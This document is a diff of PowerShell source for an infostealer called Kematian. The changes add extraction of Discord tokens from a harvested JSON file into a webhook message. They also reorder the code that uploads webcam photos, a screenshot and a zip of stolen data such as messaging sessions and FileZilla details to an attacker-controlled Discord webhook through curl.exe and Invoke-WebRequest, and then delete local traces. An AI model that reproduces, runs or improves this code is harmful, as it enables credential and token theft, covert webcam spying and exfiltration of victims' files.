@@ -816,13 +816,6 @@ Pass: $decodedPass
     $invokewebcam.WaitForExit()
     Write-Host "[!] Webcam captured !" -ForegroundColor Green
 
-    $items = Get-ChildItem -Path "$env:APPDATA\Kematian" -Filter out*.jpg
-    foreach ($item in $items) {
-        $name = $item.Name
-        curl.exe -F "payload_json={\`"username\`": \`"Kematian\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$env:APPDATA\Kematian\$name\`"" $webhook | out-null
-        Remove-Item -Path "$env:APPDATA\Kematian\$name" -Force
-    }
-
     # Works since most victims will have a weak password which can be bruteforced
     #function ExportPrivateKeys {
     #    $privatekeysfolder = "$important_files\Certificates & Private Keys"
@@ -999,10 +992,10 @@ Pass: $decodedPass
 	Write-Host "`r `n"
 	
     # Send info about the data in the Kematian.zip
-	function kematianinfo {
-		$messaging_sessions_info = if (Test-Path $folder_messaging) {
-        $messaging_sessions_content = Get-ChildItem -Path $folder_messaging | ForEach-Object { $_.Name -replace '\..+$' }
-        if ($messaging_sessions_content) {
+	function kematianinfo {	
+	$messaging_sessions_info = if (Test-Path $folder_messaging) {
+    $messaging_sessions_content = Get-ChildItem -Path $folder_messaging | ForEach-Object { $_.Name -replace '\..+$' }
+    if ($messaging_sessions_content) {
             $messaging_sessions_content -join ' | '
         } else {
             'False'
@@ -1101,8 +1094,28 @@ FileZilla: $filezilla_info
 
      return $webhookData
 	 }	 
-	    $kematainwebhook = kematianinfo
-	    $embed_and_body = @{
+	$kematainwebhook = kematianinfo
+	
+	# Send discord tokens in webhook message 
+    $discord_tokens = if (Test-Path "$folderformat\discord.json") {
+        $jsonContent = Get-Content -Path "$folderformat\discord.json" -Raw
+        $tokenMatches = [regex]::Matches($jsonContent, '"token": "(.*?)"')
+    
+        if ($tokenMatches.Count -gt 0) {
+            $tokens = foreach ($match in $tokenMatches) {
+                $token = $match.Groups[1].Value
+                $token
+            }
+            $tokens -join "`n`n"
+        } else {
+            'False'
+        }
+    } else {
+        'False'
+    }
+
+	
+    $embed_and_body = @{
         "username"    = "Kematian"
         "content"     = "@everyone"
         "title"       = "Kematian Data Extractor"
@@ -1151,6 +1164,10 @@ FileZilla: $filezilla_info
                         "name" = ":file_folder: Kematian File Info"
                         "value" = "``````$kematainwebhook``````"
                     }
+					@{
+                        "name" = ":key: Discord Token(s)"
+                        "value" = "```````n$discord_tokens``````"
+                    }
                 )
             }
         )
@@ -1159,15 +1176,25 @@ FileZilla: $filezilla_info
     $payload = $embed_and_body | ConvertTo-Json -Depth 10
     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
 	
+    # send webcam
+    $items = Get-ChildItem -Path "$env:APPDATA\Kematian" -Filter out*.jpg
+    foreach ($item in $items) {
+    $name = $item.Name
+    curl.exe -F "payload_json={\`"username\`": \`"Kematian\`", \`"content\`": \`"## :camera: Webcam\n\n\`", \`"avatar_url\`": \`"$avatar\`"}" -F "file=@\`"$env:APPDATA\Kematian\$name\`"" $webhook | out-null
+    Remove-Item -Path "$env:APPDATA\Kematian\$name" -Force
+    }
 
+    # send screenshot
+    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"Kematian\`", \`"content\`": \`"## :desktop: Screenshot\n\n\`"}" -F "file=@\`"$folder_general\screenshot.png\`"" "$($webhook)" | Out-Null
 
-    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"Kematian\`", \`"content\`": \`"# :desktop: Screenshot\n\n\`"}" -F "file=@\`"$folder_general\screenshot.png\`"" "$($webhook)" | Out-Null
-
+    # send extracted data
     Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
     curl.exe -X POST -F 'payload_json={\"username\": \"Kematian\", \"content\": \"\", \"avatar_url\": \"https://i.imgur.com/6w6qWCB.jpeg\"}' -F "file=@$env:LOCALAPPDATA\Temp\Kematian.zip" $webhook
     
 	Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
     Write-Host "`r `n"
+	
+	# cleanup
     Remove-Item "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
     Remove-Item "$folder_general" -Force -Recurse
 }
